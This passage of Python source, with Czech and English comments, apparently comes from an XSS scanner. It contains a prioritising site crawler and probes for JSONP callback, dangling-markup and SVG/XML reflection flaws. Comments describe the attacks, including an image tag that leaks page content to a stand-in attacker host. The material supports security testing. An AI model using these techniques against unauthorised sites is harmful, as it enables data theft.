        if r.status_code >= 400 or _skip_ctype:
            if _streamed:
                try:
                    r.close()       # nothing of the body was ever transferred
                except Exception:
                    pass
            result["skipped_reason"] = _skip_ctype
            return result

        # v10.89: read the body under a hard byte ceiling — see
        # _MAX_RESPONSE_BYTES. The bytes are handed back to the response object
        # so that `on_response` (passive WAF fingerprint), `.text` and `.content`
        # keep behaving exactly as they did with a buffered GET.
        if _streamed:
            _buf: List[bytes] = []
            _total = 0
            for _chunk in r.iter_content(_RESPONSE_CHUNK):
                if not _chunk:
                    continue
                _buf.append(_chunk)
                _total += len(_chunk)
                if _total >= _MAX_RESPONSE_BYTES:
                    result["truncated"] = True
                    break
            _raw = b"".join(_buf)[:_MAX_RESPONSE_BYTES]
            try:
                r._content = _raw
                r._content_consumed = True
            except Exception:
                pass
            if result["truncated"]:
                try:
                    r.close()      # release the connection, drop the rest
                except Exception:
                    pass

        result["ok"] = True
        # v10.88: decode by the DECLARED charset, not the RFC 2616 latin-1
        # fallback — see _decode_response. Everything downstream (link
        # extraction, page_html_sink, reflection matching) reads this string.
        result["html"] = _decode_response(r, _raw)
    except Exception as e:
        # v10.27: catch-all (vč. curl_cffi CurlError, který NENÍ podtřída
        # requests.RequestException) — nedosažitelný host (např. mrtvý
        # rawgithub.com odkaz z cíle) nesmí shodit crawl ani logovat ERROR.
        result["skipped_reason"] = f"request error: {type(e).__name__}"
    return result


def crawl_site(start_url: str,
               session: requests.Session,
               max_depth: int = 2,
               delay: float = 0.1,
               max_pages: int = 200,
               callbacks: Optional[Dict[str, Callable]] = None,
               cancel_event=None,
               workers: int = 5,
               timeout: float = 6.0,
               respect_robots: bool = False,
               param_url_sink: Optional[set] = None,
               on_response: Optional[Callable] = None,
               page_html_sink: Optional[dict] = None,
               html_cache_limit: int = 0) -> List[str]:
    """
    Paralelní crawler s priority queue, content-type filtrem a robots.txt podporou.

    Prioritizace:
    - Stránky s parametry = vyšší priorita (kandidáti na XSS)
    - FIFO v rámci stejné priority

    Args:
        start_url: Vstupní URL
        session: Pre-configured requests session
        max_depth: Maximální hloubka BFS
        delay: Prodleva mezi jednotlivými requesty (s) — v10.91; dříve to byla
               prodleva mezi dávkami, takže reálná frekvence byla workers/delay
        max_pages: Hard limit na počet stránek
        callbacks: Callbacks dict (on_log, on_phase, on_crawler_progress, on_crawler_done)
        cancel_event: threading.Event pro přerušení
        workers: Počet paralelních fetch workerů
        timeout: HTTP timeout per request
        respect_robots: Respektovat robots.txt (default False, opt-in)
    """
    cb = callbacks or make_callbacks()
    _cancel = cancel_event or __import__("threading").Event()

    parsed_start = urlparse(start_url)
    base_host    = (parsed_start.hostname or "").lower()
    start_norm   = normalize_url_for_crawl(start_url)

    visited:     Set[str]           = set()
    # v10.89: `queued` maps url -> the SHALLOWEST depth it has been discovered
    # at, not just membership. It used to be an add-only Set, and because this
    # queue is ordered by VALUE (?param first) rather than by depth, the first
    # sighting of a URL is NOT necessarily via its shortest path — unlike a real
    # BFS. A URL first met beyond max_depth was therefore blacklisted for good:
    # meeting it again one hop from the root hit the `in queued` guard, and its
    # only queue entry was later dropped on `depth > max_depth`. Pages plainly
    # reachable within max_depth were simply never fetched. `len()` and `in`
    # behave as before, so the enqueue budget below is unaffected.
    queued:      Dict[str, int]      = {start_norm: 0}
    # v10.89: robots-disallowed URLs get their own set. They used to be written
    # into `visited`, which is the crawl BUDGET counter (`len(visited) <
    # max_pages`), so every skipped URL consumed a page slot: a robots.txt with
    # a handful of Disallow rules ended the crawl within a few pops. Measured:
    # max_pages=6 with 10 disallowed + 10 allowed URLs fetched ZERO allowed
    # pages. Tracking them separately keeps the "never pop twice" guarantee
    # without spending budget on requests that were never made.
    robots_skipped: Set[str]         = set()
    # v10.88: URLs seeded from sitemap.xml, tracked separately — they are a
    # BONUS surface and must not consume the link-discovery budget (see the
    # enqueue cap below).
    sitemap_seeded: Set[str] = set()
    # Priority queue: (priority, sequence, url, depth); sequence = FIFO tiebreak.
    #
    # v10.88: rank by VALUE first, provenance only as the tiebreaker:
    #
    #   -1  the scan target itself
    #    0  ?param URL discovered by crawling   ← injectable, and proven live
    #    1  ?param URL published in sitemap.xml ← injectable
    #    2  plain URL discovered by crawling
    #    3  plain URL published in sitemap.xml
    #
    # Ranking by provenance FIRST (all links above all sitemap entries) is what
    # produced the bug this replaces: `/o-nas` — a static page with nowhere to
    # inject — outranked `/vyhledavani?dotaz=x`, purely because the crawler
    # happened to learn about the latter from the sitemap. For an XSS scanner a
    # URL's worth is whether it has an injectable parameter, not where its
    # address came from. Provenance still breaks ties, so the live link frontier
    # is served first among URLs of equal value — but it can no longer bury a
    # parameterised endpoint behind pages that cannot hold a finding.
    #
    # PRIO_SEED pins the scan target to the front. It used to be ranked like any
    # other URL, and since a start URL usually carries no query it sorted BEHIND
    # every query-bearing sitemap entry — on a site whose sitemap holds
    # >= max_pages such URLs the budget ran out and the target the user actually
    # asked to scan was never fetched at all.
    pq: "List[Tuple[int, int, str, int]]" = []
    seq = 0

    PRIO_SEED = -1
    PRIO_PARAM, PRIO_PLAIN = 0, 2       # +1 = the sitemap-published variant

    # v10.89: endpoint-diversity accounting — see _endpoint_signature.
    endpoint_counts: Dict[Tuple[str, str, Tuple[str, ...]], int] = {}
    endpoint_penalty: Dict[str, int] = {}
    spilled: Set[str] = set()

    def _penalty(url: str) -> int:
        """Memoised per URL: 0 while its endpoint still has room in the normal
        tier, else _ENDPOINT_SPILL_PRIORITY. Memoising matters — a URL gets
        re-pushed on sitemap promotion and on a shallower rediscovery, and it
        must not sink a tier each time."""
        pen = endpoint_penalty.get(url)
        if pen is None:
            k = _endpoint_signature(url)
            n = endpoint_counts.get(k, 0) + 1
            endpoint_counts[k] = n
            pen = 0 if n <= _ENDPOINT_TIER_LIMIT else _ENDPOINT_SPILL_PRIORITY
            endpoint_penalty[url] = pen
        return pen

    def _push(url: str, depth: int, priority: Optional[int] = None):
        nonlocal seq
        if priority is None:
            priority = PRIO_PARAM if urlparse(url).query else PRIO_PLAIN
        # The scan target is pinned to the front unconditionally; everything
        # else competes for a slot in its endpoint's tier.
        if priority != PRIO_SEED:
            priority += _penalty(url)
        heapq.heappush(pq, (priority, seq, url, depth))
        seq += 1

    _push(start_norm, 0, priority=PRIO_SEED)

    found_pages: List[str] = []
    # v10.91: every DISTINCT parameterised URL discovered, for stats['params_found'].
    param_seen: Set[str] = set()
    stats = {
        'success': 0, 'errors': 0, 'redirects': 0,
        'params_found': 0, 'skipped': 0, 'current_depth': 0,
    }

    # Robots.txt
    robots_rules: Optional[_RobotsRules] = None
    if respect_robots:
        robots_rules = _fetch_robots_txt(session, start_url, timeout=timeout)
        if robots_rules:
            _n_allow = len(robots_rules) - robots_rules.n_disallow
            cb["on_log"](f"robots.txt: {len(robots_rules)} pravidel "
                         f"({robots_rules.n_disallow} Disallow / {_n_allow} Allow)",
                         "info")
            if not _is_allowed_by_robots(start_norm, robots_rules):
                cb["on_log"]("robots.txt disallows the scan target itself — "
                             "fetching it anyway (explicit operator request); "
                             "links from it still respect the rules.", "warn")

    # v10.87: seed from sitemap.xml — the site's own published URL space.
    # Without it, anything not reachable by following links within max_depth was
    # never scanned at all. Seeds are pushed at depth 0 so their own links still
    # get followed; robots/dedup/scope rules below apply to them unchanged.
    #
    # v10.88: seeds are ADDITIVE. Previously they were pushed at the normal
    # priority and counted against the enqueue cap, so a sitemap with >=
    # max_pages entries filled the queue before the first page was even fetched
    # and NO link discovered by crawling was ever enqueued — the crawler
    # silently degraded into "read the sitemap" (measured: 20/20 pages from the
    # sitemap, 0 from links). They now sit in their own lower priority tier,
    # crawled once the live link frontier is exhausted, and do not consume the
    # link budget.
    try:
        _sm = _fetch_sitemap_urls(session, start_url, base_host, timeout=timeout,
                                  max_urls=max(0, max_pages))
        _sm_new = 0
        for _u in _sm:
            try:
                _n = normalize_url_for_crawl(_u)
            except Exception:
                continue
            if _n in queued:
                continue
            queued[_n] = 0
            sitemap_seeded.add(_n)
            # One tier below a crawled URL of the SAME value — see the priority
            # table above. A published ?param endpoint therefore still outranks
            # a linked page with nothing to inject into.
            _push(_n, 0, priority=(PRIO_PARAM if urlparse(_n).query
                                   else PRIO_PLAIN) + 1)
            _sm_new += 1
        if _sm_new:
            # Honest wording: these are QUEUED, not promised fetches — the total
            # stays capped at max_pages.
            _sm_param = sum(1 for _q in sitemap_seeded if urlparse(_q).query)
            cb["on_log"](f"sitemap.xml: +{_sm_new} URLs queued "
                         f"({_sm_param} with parameters, prioritized before static "
                         f"links; cap stays max_pages={max_pages})", "info")
    except Exception:
        pass   # discovery bonus only — never let it break the crawl

    cb["on_log"](f"Crawler: max_depth={max_depth}, max_pages={max_pages}, workers={workers}, host={base_host}", "info")
    cb["on_phase"]("crawler_start", {"target": base_host, "max_depth": max_depth, "max_pages": max_pages})

    start_time  = time.time()
    last_update = time.time()

    with ThreadPoolExecutor(max_workers=workers) as exe:
        while pq and len(visited) < max_pages and not _cancel.is_set():
            # Vezmi batch URL z fronty (max `workers` najednou)
            batch: List[Tuple[str, int]] = []
            # v10.88: a URL can legitimately hold TWO heap entries (a sitemap
            # seed that was later promoted on rediscovery, see below). Entries
            # only reach `visited` after the batch is fetched, so without this
            # guard both twins could land in the SAME batch and the page would
            # be downloaded twice.
            batch_urls: Set[str] = set()
            while pq and len(batch) < workers and len(visited) + len(batch) < max_pages:
                _prio, _seq, url, depth = heapq.heappop(pq)
                if (url in visited or url in batch_urls
                        or url in robots_skipped or depth > max_depth):
                    continue
                # v10.89: the SCAN TARGET is exempt. robots.txt governs
                # autonomous discovery, not a URL the operator explicitly asked
                # to test — and enforcing it here is self-defeating: on the
                # standard `Disallow: /` + `Allow: /public/` shape the seed is
                # disallowed, so nothing is ever fetched, nothing is discovered,
                # and the site's own `Allow:` becomes unreachable. Measured:
                # 0 pages crawled on exactly that robots.txt. Links found ON the
                # seed still obey the rules, so this exempts one URL, not a site.
                if (respect_robots and url != start_norm
                        and not _is_allowed_by_robots(url, robots_rules)):
                    stats['skipped'] += 1
                    robots_skipped.add(url)     # v10.89: NOT `visited` — see above
                    continue
                batch.append((url, depth))
                batch_urls.add(url)

            if not batch:
                break

            # Submit batch do executoru
            future_to_meta = {
                exe.submit(_fetch_page, session, url, timeout): (url, depth)
                for url, depth in batch
            }

            for fut in as_completed(future_to_meta):
                if _cancel.is_set():
                    break
                url, depth = future_to_meta[fut]
                visited.add(url)
                stats['current_depth'] = max(stats['current_depth'], depth)

                try:
                    result = fut.result()
                except Exception:
                    stats['errors'] += 1
                    continue

                # v10.52: passive WAF fingerprint INLINE during crawl — run on
                # every response we got (incl. 4xx challenge pages, before the
                # skip/ok filters), exactly where the old re-fetch phase ran it.
                # Eliminates a second full pass over the site (was ~20 min on a
                # 370-page target). Best-effort; never breaks the crawl.
                if on_response is not None:
                    _resp = result.get("resp")
                    if _resp is not None:
                        try:
                            on_response(_resp)
                        except Exception:
                            pass

                if result["is_redirect"]:
                    stats['redirects'] += 1

                if result["skipped_reason"]:
                    stats['skipped'] += 1
                    continue

                if not result["ok"]:
                    stats['errors'] += 1
                    continue

                # ── v10.89: everything below is relative to the FINAL url ──
                # `requests` follows redirects for us, and the document we now
                # hold belongs to the redirect DESTINATION. Resolving its
                # relative links against the url we *asked for* produced wrong
                # absolute URLs: with /go -> /app/v2/home, `href="page?q=1"`
                # resolved to /page?q=1 — a URL that does not exist — while the
                # real endpoint /app/v2/page?q=1 was never seen. (The same bug
                # was already fixed once for <base href>; the redirect path kept
                # it.) Registering the destination as visited/queued also stops
                # a page reachable both directly and via a redirect from being
                # downloaded twice, and puts the analysable url — not the 30x
                # hop — into found_pages for the phases that consume it.
                page_url = url
                if result["is_redirect"]:
                    try:
                        _final = getattr(result.get("resp"), "url", "") or ""
                        if _final:
                            _fn = normalize_url_for_crawl(_final)
                            # Only adopt an in-scope destination: an off-site
                            # redirect must not drag the crawl out of scope.
                            if _hosts_match(urlparse(_fn).hostname or "", base_host):
                                page_url = _fn
                    except Exception:
                        page_url = url
                if page_url != url:
                    if page_url in visited:
                        # Already crawled under its own address — the redirect
                        # hop adds nothing.
                        continue
                    visited.add(page_url)
                    queued.setdefault(page_url, depth)

                # Counted here, not before the redirect-dedup `continue` above,
                # so the old invariant success == len(found_pages) still holds.
                stats['success'] += 1
                found_pages.append(page_url)

                # v10.52: cache the already-downloaded HTML (bounded) so later
                # phases that analyse crawled pages (mutation/postMessage/
                # websocket/static-js/trusted-types/blind) reuse it instead of
                # re-fetching. Bound covers the largest subset any phase uses
                # (pages[:50]); beyond that they fall back to a fetch.
                if page_html_sink is not None and len(page_html_sink) < html_cache_limit:
                    page_html_sink[page_url] = result["html"]

                # Extract linků
                links, param_count = _extract_links(result["html"], page_url,
                                                    base_host, param_seen)
                # v10.87: a JSON body has no <a href>, so the HTML extractor
                # returns nothing for it — mine its link fields instead.
                _ct = ""
                try:
                    _ct = ((result.get("resp").headers.get("Content-Type") or "")
                           .lower()) if result.get("resp") is not None else ""
                except Exception:
                    _ct = ""
                if "json" in _ct or (not links and (result["html"] or "").lstrip()[:1] in ("{", "[")):
                    _jl, _jp = _extract_links_from_json(result["html"], page_url,
                                                        base_host,
                                                        param_sink=param_seen)
                    links.extend(_jl)
                    param_count += _jp
                # v10.91: DISTINCT parameterised URLs seen so far, not the sum of
                # per-page counts (a nav link on 200 pages used to count 200×).
                stats['params_found'] = len(param_seen)

                # v10.52: collect parameter URLs INLINE from the page we just
                # downloaded — identical to find_param_urls() in the old re-fetch
                # phase, but with zero extra network (the HTML is already here).
                if param_url_sink is not None:
                    try:
                        for _pu in find_param_urls(result["html"], page_url):
                            param_url_sink.add(_pu)
                    except Exception:
                        pass

                # Enqueue nové URL
                for link in links:
                    link_norm = normalize_url_for_crawl(link)
                    if link_norm in visited:
                        continue
                    # v10.89: apply robots at DISCOVERY, not only at pop. The
                    # enqueue cap below counts every URL ever queued, so URLs we
                    # are never going to fetch were still spending the discovery
                    # budget: a site whose Disallow rules cover the links that
                    # happen to appear first in the page filled `queued` to
                    # max_pages with dead entries and no allowed URL was ever
                    # queued at all. The pop-time check stays — it still guards
                    # the seed and the sitemap tier.
                    if respect_robots:
                        if link_norm in robots_skipped:
                            continue
                        if not _is_allowed_by_robots(link_norm, robots_rules):
                            stats['skipped'] += 1
                            robots_skipped.add(link_norm)
                            continue
                    link_depth = depth + 1
                    if link_norm in queued:
                        # v10.89: we may have met this URL before by a LONGER
                        # path — this queue is ranked by value, not by depth, so
                        # first sighting != shortest path. If this sighting is
                        # strictly shallower, record it and re-push: the entry
                        # already in the heap may be sitting beyond max_depth and
                        # doomed to be dropped, which is exactly how reachable
                        # pages went permanently unfetched.
                        if link_depth < queued[link_norm]:
                            queued[link_norm] = link_depth
                            sitemap_seeded.discard(link_norm)
                            _push(link_norm, link_depth)
                        # v10.88: a sitemap entry that ALSO turns out to be
                        # genuinely linked is a LIVE link — promote it out of the
                        # additive tier. Without this, merely appearing in the
                        # sitemap DEMOTES a URL: `/search?q=1` is priority 0 when
                        # only linked, but priority 2 once the sitemap lists it,
                        # so a pile of query-less links outranks it and it loses
                        # its scan slot. Publishing a sitemap would then make
                        # coverage of exactly the high-value ?param URLs WORSE
                        # than having none. The stale tier-2 twin stays in the
                        # heap and is skipped later via `visited`/`batch_urls`.
                        elif link_norm in sitemap_seeded:
                            sitemap_seeded.discard(link_norm)
                            _push(link_norm, link_depth)
                        continue
                    # v10.77: `queued` is add-only and already holds EVERY URL ever
                    # discovered (visited ones included), so the old
                    # `len(visited)+len(queued)` double-counted visited and stopped
                    # discovery at ~half max_pages. `queued` alone is the true total.
                    # v10.88: discount the sitemap seeds — they are an extra
                    # surface pushed in before the crawl even starts, and
                    # counting them here let a large sitemap zero out link
                    # discovery entirely.
                    # v10.89: discount the SPILLED URLs for the same reason. A
                    # listing page emitting 1500 `/clanek?id=N` links would
                    # otherwise fill `queued` to max_pages with copies of one
                    # endpoint and end link discovery right there — reordering
                    # the queue alone would not have helped, because nothing
                    # else ever got discovered. Spilled URLs carry their own
                    # bound so a calendar-style URL trap still cannot grow the
                    # queue without limit.
                    if _penalty(link_norm):
                        if len(spilled) >= max_pages:
                            continue
                        spilled.add(link_norm)
                    elif len(queued) - len(sitemap_seeded) - len(spilled) >= max_pages:
                        break
                    queued[link_norm] = link_depth
                    _push(link_norm, link_depth)

                # Progress callback (max 1×/s)
                now = time.time()
                if now - last_update >= 1.0:
                    elapsed = now - start_time
                    rate    = len(visited) / elapsed if elapsed > 0 else 0
                    eta     = (max_pages - len(visited)) / rate if rate > 0 else 0
                    cb["on_crawler_progress"]({
                        "visited":      len(visited),
                        "max_pages":    max_pages,
                        "depth":        stats['current_depth'],
                        "success":      stats['success'],
                        "errors":       stats['errors'],
                        "skipped":      stats['skipped'],
                        "queue":        len(pq),
                        "rate":         rate,
                        "eta":          eta,
                        "params_found": stats['params_found'],
                        "current_url":  page_url,
                    })
                    last_update = now

            # v10.91: `delay` is PER REQUEST, not per batch. It used to be one
            # sleep per batch of `workers` fetches, so the real request rate was
            # workers/delay — someone setting --crawl-delay 1.0 to be polite (or
            # to stay under a WAF's threshold) got 5 req/s, not 1. Scaling by the
            # batch size restores the advertised spacing without serialising the
            # workers; fetch time is on top, so this only ever errs slower.
            if delay > 0 and batch:
                time.sleep(delay * len(batch))

        # v10.91: on cancel, drop everything still queued in the executor
        # instead of letting it drain. Fetches already in flight cannot be
        # interrupted — they are bounded by `timeout` — but nothing new starts.
        if _cancel.is_set():
            try:
                exe.shutdown(wait=False, cancel_futures=True)
            except TypeError:       # Python < 3.9
                exe.shutdown(wait=False)

    elapsed_total = time.time() - start_time
    cb["on_crawler_done"]({
        "pages":        len(found_pages),
        "elapsed":      elapsed_total,
        "success":      stats['success'],
        "errors":       stats['errors'],
        "skipped":      stats['skipped'],
        "redirects":    stats['redirects'],
        "params_found": stats['params_found'],
    })
    return found_pages


# ── JSONP callback injection (v10.16) ────────────────────────────────────────
# High-value: endpoint, který reflektuje ?callback=NAME do těla odpovědi s
# JS content-type, je přímý XSS — útočník nahraje <script src="endpoint?
# callback=alert(1)//"> na cizí stránku a kód se spustí v kontextu oběti.
# Klasický bug-bounty nález (často přehlížený, protože není v HTML).
_JSONP_CALLBACK_PARAMS = [
    "callback", "jsonp", "cb", "jsonpcallback", "jsoncallback",
    "json_callback", "jscallback", "function", "fn", "onload", "handler",
]
_JSONP_JS_CONTENT_TYPES = (
    "application/javascript", "text/javascript", "application/x-javascript",
    "application/json-p", "text/jscript",
)


def scan_jsonp_callback(session: "requests.Session", url: str,
                        timeout: float, follow_redirects: bool) -> Optional[dict]:
    """Otestuje, jestli URL je zranitelný JSONP endpoint (callback reflection
    do JS-content-type odpovědi). Vrací finding dict nebo None.

    Detekce:
      1. Najdi existující callback-like param v URL, nebo zkus přidat
         ?callback=<probe> pokud žádný není.
      2. Pošli unikátní JS-identifier probe (např. xsgJsonpPROBE123).
      3. Hit, pokud:
         a) probe se reflektuje RAW v těle (typicky na začátku: `PROBE(`),
         b) A response má JS content-type (nebo probe je voláno jako funkce).
    """
    import re as _re
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    probe = "xsgJsonp" + random_marker(8)

    # Vyber callback param: existující, nebo přidej standardní
    target_params = [p for p in qs if p.lower() in _JSONP_CALLBACK_PARAMS]
    added = False
    if not target_params:
        # Zkus přidat ?callback= — mnoho JSONP endpointů ho akceptuje i bez
        # toho, aby byl v původní URL.
        target_params = ["callback"]
        added = True

    for cbparam in target_params:
        if added:
            test_qs = dict(qs)
            test_qs[cbparam] = [probe]
            new_query = urlencode({k: v[0] if isinstance(v, list) else v
                                   for k, v in test_qs.items()})
            test_url = parsed._replace(query=new_query).geturl()
        else:
            test_url = inject_into_params(url, cbparam, probe)
        if not test_url:
            continue
        try:
            r = session.get(test_url, timeout=timeout,
                            allow_redirects=follow_redirects)
        except _NET_EXCEPTIONS:
            continue
        body = r.text or ""
        ct = (r.headers.get("Content-Type", "") or "").lower()
        is_js_ct = any(j in ct for j in _JSONP_JS_CONTENT_TYPES)
        # Probe reflektovaný jako volání funkce: `PROBE(` nebo `PROBE (`
        called_as_fn = bool(_re.search(
            _re.escape(probe) + r"\s*\(", body))
        raw_reflected = probe in body
        # Hit: probe voláno jako funkce (silný signál) NEBO raw reflexe v
        # JS content-type. HTML content-type s reflexí = běžné XSS, ne JSONP.
        if called_as_fn and (is_js_ct or not ct.startswith("text/html")):
            # v10.25 FP gate: callback reflexe je JSONP DESIGN pattern (mnoho
            # legitimních API ho používá), ne sama o sobě high vuln. Reálné
            # riziko = únik citlivých dat cross-origin NEBO callback-based XSS.
            # Bez potvrzení sensitivních dat / executability → low + fp_risk.
            return {
                "url": test_url,
                "param": cbparam,
                "context": "jsonp-callback-injection",
                "source": "jsonp",
                "severity": "low",
                "fp_risk": True,
                "fp_reason": ("JSONP endpoint (callback reflected as function "
                              "call) — this is a common design pattern; XSSI/"
                              "data-leak impact requires the response to expose "
                              "sensitive data. Verify response sensitivity "
                              "(or callback-based XSS) before treating as high."),
                "content_type": ct,
                "evidence": f"callback '{probe}' reflected as function call"
                            + (f" with JS content-type {ct}" if is_js_ct else ""),
                "cwe_hint": "CWE-829",
            }
        if raw_reflected and is_js_ct:
            return {
                "url": test_url,
                "param": cbparam,
                "context": "jsonp-callback-injection",
                "source": "jsonp",
                "severity": "info",
                "fp_risk": True,
                "fp_reason": ("raw callback reflection in JS response — JSONP-"
                              "like; verify sensitive-data exposure / XSS."),
                "content_type": ct,
                "evidence": f"callback '{probe}' reflected raw in {ct} response",
                "cwe_hint": "CWE-829",
            }
    return None


# ── Dangling markup injection (v10.16) ───────────────────────────────────────
# High-value, CSP-resistant: když nelze spustit script, útočník injektuje
# NEUZAVŘENÝ tag (např. <img src='//attacker/log?q=) a prohlížeč "pohltí"
# následující HTML (CSRF tokeny, citlivý obsah) až do dalšího ' nebo ` —
# a pošle ho útočníkovi v query stringu obrázku. Funguje I KDYŽ je XSS jinak
# blokovaný (CSP bez unsafe-inline), proto vysoká hodnota a časté přehlédnutí.
#
# Detekce (bezpečná, neexfiltruje nikam — jen ověří reflexi schopnou pohltit):
#   1. Injektuj marker s neuzavřenou single-quote atribut hodnotou:
#        <xsgdm a='MARKER     (žádná uzavírací ' ani >)
#   2. Hit, pokud se marker reflektuje RAW (neescapovaný < ' ) do HTML
#      odpovědi — to znamená, že injektovaný neuzavřený atribut zůstane
#      otevřený a pohltí následující markup.
_DANGLING_MARKUP_PROBES = [
    # (popis, payload_template s {m} markerem, signatura co musí zůstat raw)
    ("single-quote attribute swallow",
     "<xsgdm x='{m}", "<xsgdm x='{m}"),
    ('double-quote attribute swallow',
     '<xsgdm x="{m}', '<xsgdm x="{m}'),
    # <base href bez uzavření — přesměruje relativní zdroje (i bez scriptu)
    ("base-href injection",
     "<base href='//{m}", "<base href='//{m}"),
]


def scan_dangling_markup(session: "requests.Session", url: str, param: str,
                         timeout: float, follow_redirects: bool) -> Optional[dict]:
    """Otestuje, jestli parametr umožňuje dangling-markup injection (pohlcení
    HTML neuzavřeným tagem/atributem). Vrací finding dict nebo None.

    Neescapovaná reflexe `<xsgdm x='MARKER` znamená, že injektovaný otevřený
    atribut zůstane otevřený a pohltí následující markup do dalšího quote —
    klasická scriptless exfiltrace (funguje i přes CSP).
    """
    for desc, tmpl, sig_tmpl in _DANGLING_MARKUP_PROBES:
        marker = "xsgDM" + random_marker(7)
        payload = tmpl.format(m=marker)
        sig = sig_tmpl.format(m=marker)
        test_url = inject_into_params(url, param, payload)
        if not test_url:
            continue
        try:
            r = session.get(test_url, timeout=timeout,
                            allow_redirects=follow_redirects)
        except _NET_EXCEPTIONS:
            continue
        ct = (r.headers.get("Content-Type", "") or "").lower()
        # Dangling markup dává smysl jen v HTML kontextu
        if ct and "html" not in ct:
            continue
        body = r.text or ""
        # Hit jen pokud RAW (neescapovaná) reflexe — escapované < nebo '
        # by tag neotevřely. Tedy hledáme přesně injektovaný neescapovaný tvar.
        if sig in body:
            esc_forms = ["&lt;xsgdm", "&#60;xsgdm", "%3cxsgdm"]
            raw_idx = body.find(sig)
            window = body[max(0, raw_idx - 10):raw_idx + len(sig)]
            if not any(e in window.lower() for e in esc_forms):
                # v10.19: ověř, že injektovaný tag je v REÁLNĚ spustitelné
                # HTML pozici — ne uvnitř inertního kontejneru (komentář,
                # <script>, <textarea>, <title>, <pre>, CDATA), kde by
                # neuzavřený tag NEpohltil markup. Bez tohohle by raw reflexe
                # v <!-- --> nebo <script>"..."</script> dělala FP.
                if not _dangling_is_executable(body, raw_idx):
                    # raw reflexe, ale v inertním kontextu → ne dangling sink
                    continue
                return {
                    "url": test_url,
                    "param": param,
                    "context": "dangling-markup",
                    "source": "dangling-markup",
                    "severity": "high",
                    "evidence": f"{desc}: open tag/attr reflected raw — swallows "
                                f"following HTML (scriptless exfil, CSP-resistant)",
                    "cwe_hint": "CWE-79",
                }
    return None


def _dangling_is_executable(body: str, idx: int) -> bool:
    """True když je pozice `idx` (kde je injektovaný neuzavřený tag) v reálné
    HTML pozici, kde tag pohltí následující markup — NE uvnitř inertního
    kontejneru, kde se s '<' zachází jako s textem.

    Inertní kontejnery: HTML komentář <!-- -->, <script>, <style>,
    <textarea>, <title>, <pre>, <xmp>, CDATA. Uvnitř nich neuzavřený
    `<xsgdm x='` markup nepohltí — prohlížeč ho bere jako text/PCDATA.
    """
    pre = body[:idx].lower()
    # 1) HTML komentář: poslední <!-- bez uzavírajícího -->
    last_comment_open = pre.rfind("<!--")
    last_comment_close = pre.rfind("-->")
    if last_comment_open != -1 and last_comment_open > last_comment_close:
        return False
    # 2) CDATA blok
    last_cdata_open = pre.rfind("<![cdata[")
    last_cdata_close = pre.rfind("]]>")
    if last_cdata_open != -1 and last_cdata_open > last_cdata_close:
        return False
    # 3) Rawtext/RCDATA/inertní elementy: poslední otevírací bez uzavíracího
    for tag in ("script", "style", "textarea", "title", "pre", "xmp"):
        last_open = pre.rfind(f"<{tag}")
        last_close = pre.rfind(f"</{tag}>")
        if last_open != -1 and last_open > last_close:
            return False
    return True


# ── SVG / non-HTML content-type reflection (v10.16) ──────────────────────────
# High-value, často missnuté: parametr reflektovaný do odpovědi servírované
# jako image/svg+xml nebo application/xml → SVG se <script> se spustí při
# PŘÍMÉM přístupu na URL. Scannery co kontrolují jen text/html to minou.
_SVG_XML_CONTENT_TYPES = (
    "image/svg+xml", "application/xml", "text/xml",
    "application/xhtml+xml", "application/rss+xml", "application/atom+xml",
)


def scan_svg_xml_reflection(session: "requests.Session", url: str, param: str,
                            timeout: float, follow_redirects: bool) -> Optional[dict]:
    """Otestuje reflexi parametru do SVG/XML content-type odpovědi (XSS přes
    přímý přístup na URL). Vrací finding dict nebo None.
    """
    marker = "xsgSVG" + random_marker(7)
    payload = f'<svg xmlns="http://www.w3.org/2000/svg"><script>/*{marker}*/</script></svg>'
    test_url = inject_into_params(url, param, payload)
    if not test_url:
        return None
    try:
        r = session.get(test_url, timeout=timeout,
                        allow_redirects=follow_redirects)
    except _NET_EXCEPTIONS:
        return None
    ct = (r.headers.get("Content-Type", "") or "").lower()
    is_svg_xml = any(j in ct for j in _SVG_XML_CONTENT_TYPES)
    if not is_svg_xml:
        return None
    body = r.text or ""
    raw_sig = f"<script>/*{marker}*/</script>"
    if raw_sig in body:
        return {
            "url": test_url,
            "param": param,
            "context": "svg-xml-reflection",
            "source": "svg-xml",
            "severity": "high",
            "content_type": ct,
            "evidence": f"marker reflected raw as <script> in {ct} — executes on "
                        f"direct URL access (SVG/XML treated as document)",
            "cwe_hint": "CWE-79",
        }
    bare = f"/*{marker}*/"
    if bare in body and ("&lt;" not in body[:body.find(bare)][-20:] if bare in body else False):
        return {
            "url": test_url,
            "param": param,
            "context": "svg-xml-reflection",
            "source": "svg-xml",
            "severity": "medium",
            "content_type": ct,
            "evidence": f"marker reflected raw in {ct} — potential XSS via direct "
                        f"access (verify script execution)",
            "cwe_hint": "CWE-79",
        }
    return None


def inject_into_params(url: str, param_name: str, new_value: str, extra_params: dict = None) -> Optional[str]:
    parsed = urlparse(url)
    qs     = parse_qs(parsed.query, keep_blank_values=True)
    if param_name not in qs:
        return None
    qs[param_name] = [new_value]
    if extra_params:
        for k, v in extra_params.items():
            qs[k] = [v]
    new_q = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_q))


def _ascii_safe_url(url: str) -> str:
    """Percent-encode any non-ASCII bytes in a URL so it is always safe on the
    wire. Real sites (esp. non-English) expose non-ASCII paths — e.g. Czech
    listings like '.../pozemek_2_318_m²_...'. The scanner's custom session /
    adapters can raise UnicodeError on a raw non-ASCII URL (bare requests
    tolerates it, but the retry/impersonation stack may not), which — in a phase
    that only catches network errors — crashed the whole scan. The server decodes
    the %XX back identically, so this is behaviour-preserving; it also means those
    URLs get actually SCANNED instead of silently erroring. Unchanged on failure."""
    try:
        if url.isascii():
            return url
        p = urlparse(url)
        netloc = p.netloc
        host = p.hostname or ""
        if host and not host.isascii():
            try:
                netloc = netloc.replace(host, host.encode("idna").decode("ascii"))
            except Exception:
                pass
        path = quote(p.path, safe="/%:@!$&'()*+,;=~-._")
        query = quote(p.query, safe="=&%:@!$'()*+,;/?~-._")
        frag = quote(p.fragment, safe="%~-._")
        return urlunparse((p.scheme, netloc, path, p.params, query, frag))
    except Exception:
        return url


def _bind_cancel_to_session(sess, cancel_event):
    """Make EVERY request on this session abort immediately once the scan is
    cancelled — the key to a responsive Stop.

    session.close() from another thread does NOT interrupt an in-flight blocking
    request (verified). Raising before each request instead means that after Stop,
    only the ONE request already in flight per worker thread finishes (bounded by
    its own timeout); every queued / subsequent request across EVERY phase bails
